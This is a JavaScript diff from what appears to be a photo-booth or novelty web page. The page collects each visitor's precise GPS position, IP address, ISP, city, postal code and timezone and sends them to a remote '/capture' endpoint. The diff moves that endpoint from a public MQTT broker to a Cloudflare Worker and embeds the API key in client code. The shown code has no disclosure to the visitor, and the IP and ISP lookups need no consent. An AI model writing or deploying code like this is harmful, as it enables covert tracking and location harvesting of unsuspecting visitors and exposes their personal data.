@@ -1,152 +1,176 @@
+const CAPTURE_API = 'https://lamanlucuku-api.diravaiot.workers.dev/capture';
+const APP_API_KEY = 'LMK_SEC_KEY_889922'; // Sesuaikan dengan APP_API_KEY yang diset di Cloudflare Worker
 
-var MQTT_BROKER = 'wss://broker.hivemq.com:8884/mqtt'
-var MQTT_TOPIC  = 'lamanukku/v1/captures'
+function fetchWithTimeout(url, ms, headers) {
+  const ctrl = new AbortController();
+  setTimeout(() => ctrl.abort(), ms);
 
-// ── GPS: minta izin, timeout 12 detik ────────────────────────────
-function tryGPS () {
-  return new Promise(function (resolve) {
-    if (!navigator.geolocation) { resolve(null); return }
+  return fetch(url, {
+    signal: ctrl.signal,
+    headers: headers || {}
+  });
+}
 
-    var settled = false
-    function done (val) { if (!settled) { settled = true; resolve(val) } }
+function tryGPS() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve(null);
+      return;
+    }
+
+    let settled = false;
+
+    const done = (val) => {
+      if (!settled) {
+        settled = true;
+        resolve(val);
+      }
+    };
 
     navigator.geolocation.getCurrentPosition(
-      function (pos) { done(pos.coords) },
-      function ()    { done(null) },
-      { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
-    )
-    setTimeout(function () { done(null) }, 12000)
-  })
+      (pos) => done(pos.coords),
+      () => done(null),
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 60000
+      }
+    );
+
+    setTimeout(() => done(null), 12000);
+  });
 }
 
-// ── Data dari IP (ISP, kota, timezone) ───────────────────────────
-async function getIPData () {
-  // 1. ipapi.co
+async function getIPData() {
   try {
-    var r = await fetchWithTimeout('https://ipapi.co/json/', 7000)
-    var d = await r.json()
+    const r = await fetchWithTimeout('https://ipapi.co/json/', 7000);
+    const d = await r.json();
+
     if (d && d.ip) {
       return {
-        ip: d.ip, city: d.city || '-', region: d.region || '-',
-        country: d.country_name || '-', lat: d.latitude || 0,
-        lon: d.longitude || 0, isp: d.org || '-',
-        timezone: d.timezone || '-', postal: d.postal || '-'
-      }
+        ip: d.ip,
+        city: d.city || '-',
+        region: d.region || '-',
+        country: d.country_name || '-',
+        lat: d.latitude || 0,
+        lon: d.longitude || 0,
+        isp: d.org || '-',
+        timezone: d.timezone || '-',
+        postal: d.postal || '-'
+      };
     }
   } catch (_) {}
 
-  // 2. ip-api.com fallback
   try {
-    var r2 = await fetchWithTimeout(
-      'https://ip-api.com/json/?fields=status,query,country,regionName,city,zip,lat,lon,isp,timezone', 7000
-    )
-    var d2 = await r2.json()
+    const url = 'https://ip-api.com/json/?fields=status,query,country,regionName,city,zip,lat,lon,isp,timezone';
+    const r2 = await fetchWithTimeout(url, 7000);
+    const d2 = await r2.json();
+
     if (d2 && d2.status === 'success') {
       return {
-        ip: d2.query, city: d2.city || '-', region: d2.regionName || '-',
-        country: d2.country || '-', lat: d2.lat || 0, lon: d2.lon || 0,
-        isp: d2.isp || '-', timezone: d2.timezone || '-', postal: d2.zip || '-'
-      }
+        ip: d2.query,
+        city: d2.city || '-',
+        region: d2.regionName || '-',
+        country: d2.country || '-',
+        lat: d2.lat || 0,
+        lon: d2.lon || 0,
+        isp: d2.isp || '-',
+        timezone: d2.timezone || '-',
+        postal: d2.zip || '-'
+      };
     }
   } catch (_) {}
 
-  // 3. ipify (hanya IP, no-crash fallback)
   try {
-    var r3 = await fetchWithTimeout('https://api.ipify.org?format=json', 5000)
-    var d3 = await r3.json()
-    if (d3 && d3.ip) return { ip: d3.ip }
+    const r3 = await fetchWithTimeout('https://api.ipify.org?format=json', 5000);
+    const d3 = await r3.json();
+
+    if (d3 && d3.ip) {
+      return { ip: d3.ip };
+    }
   } catch (_) {}
 
-  return {}
+  return {};
 }
 
-// ── Reverse geocoding dari GPS (Nominatim, gratis) ────────────────
-async function reverseGeocode (lat, lon) {
+async function reverseGeocode(lat, lon) {
   try {
-    var url = 'https://nominatim.openstreetmap.org/reverse?format=json'
-            + '&lat=' + lat + '&lon=' + lon + '&accept-language=id&zoom=14'
-    var r = await fetchWithTimeout(url, 8000, {
+    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&accept-language=id&zoom=14`;
+    const r = await fetchWithTimeout(url, 8000, {
       'User-Agent': 'SnapBooth/1.0 (Final Project)'
-    })
-    var d = await r.json()
-    var a = d.address || {}
+    });
+
+    const d = await r.json();
+    const a = d.address || {};
+
     return {
-      city:    a.city || a.town || a.village || a.county || '-',
-      region:  a.state || a.province || '-',
+      city: a.city || a.town || a.village || a.county || '-',
+      region: a.state || a.province || '-',
       country: a.country || '-',
-      postal:  a.postcode || '-'
-    }
+      postal: a.postcode || '-'
+    };
   } catch (_) {
-    return {}
+    return {};
   }
 }
 
-// ── Gabungkan GPS + IP → satu objek lokasi ────────────────────────
-async function buildLocation (gps, ipData) {
-  if (!ipData) ipData = {}
-
+async function buildLocation(gps, ipData = {}) {
   if (gps) {
-    var geo = await reverseGeocode(gps.latitude, gps.longitude).catch(function () { return {} })
+    const geo = await reverseGeocode(gps.latitude, gps.longitude).catch(() => ({}));
+
     return {
-      source:   'gps',
+      source: 'gps',
       accuracy: Math.round(gps.accuracy),
-      lat:      gps.latitude,
-      lon:      gps.longitude,
+      lat: gps.latitude,
+      lon: gps.longitude,
       altitude: gps.altitude ? Math.round(gps.altitude) : null,
-      city:     geo.city    || ipData.city    || '-',
-      region:   geo.region  || ipData.region  || '-',
-      country:  geo.country || ipData.country || '-',
-      postal:   geo.postal  || ipData.postal  || '-',
-      ip:       ipData.ip      || '-',
-      isp:      ipData.isp     || '-',
-      timezone: ipData.timezone|| '-'
-    }
+      city: geo.city || ipData.city || '-',
+      region: geo.region || ipData.region || '-',
+      country: geo.country || ipData.country || '-',
+      postal: geo.postal || ipData.postal || '-',
+      ip: ipData.ip || '-',
+      isp: ipData.isp || '-',
+      timezone: ipData.timezone || '-'
+    };
   }
 
   if (ipData && ipData.ip) {
-    return Object.assign({ source: 'ip', accuracy: null }, ipData)
+    return {
+      source: 'ip',
+      accuracy: null,
+      ...ipData
+    };
   }
 
-  return null
+  return null;
 }
 
-// ── MQTT publish ──────────────────────────────────────────────────
-function publishMQTT (payload) {
-  return new Promise(function (resolve) {
-    if (typeof mqtt === 'undefined') { resolve(false); return }
+async function publishMQTT(payload) {
+  try {
+    const payloadText = JSON.stringify(payload);
 
-    var done = false
-    function finish (v) { if (!done) { done = true; resolve(v) } }
+    const response = await fetch(CAPTURE_API, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-App-Key': APP_API_KEY
+      },
+      body: payloadText
+    });
 
+    let result;
     try {
-      var clientId = 'snap_' + Math.random().toString(36).substr(2, 8)
-      var client = mqtt.connect(MQTT_BROKER, {
-        clientId:        clientId,
-        clean:           true,
-        connectTimeout:  10000,
-        reconnectPeriod: 0
-      })
-
-      client.on('connect', function () {
-        var msg = JSON.stringify(payload)
-        client.publish(MQTT_TOPIC, msg, { qos: 1 }, function (err) {
-          client.end(true)
-          finish(!err)
-        })
-      })
-
-      client.on('error', function () { client.end(true); finish(false) })
-      setTimeout(function () { finish(false) }, 18000)
-
-    } catch (e) {
-      finish(false)
+      result = await response.json();
+    } catch (_) {
+      result = null;
     }
-  })
-}
 
-// ── Helpers ───────────────────────────────────────────────────────
-function fetchWithTimeout (url, ms, headers) {
-  var ctrl = new AbortController()
-  setTimeout(function () { ctrl.abort() }, ms)
-  return fetch(url, { signal: ctrl.signal, headers: headers || {} })
+    if (response.ok && result?.ok === true) {
+      return true;
+    }
+
+    return false;
+  } catch (error) {
+    return false;
+  }
 }
